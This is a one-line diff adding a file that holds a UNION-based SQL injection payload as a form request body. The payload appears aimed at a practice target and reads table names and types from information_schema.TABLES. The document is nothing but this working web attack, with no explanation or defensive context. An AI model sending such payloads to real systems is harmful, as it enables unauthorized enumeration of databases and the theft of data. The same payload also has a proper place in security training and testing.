@@ -1,0 +1,1 @@
+id=4 union SELECT TABLE_NAME,TABLE_TYPE FROM information_schema.TABLES#&Submit=Submit
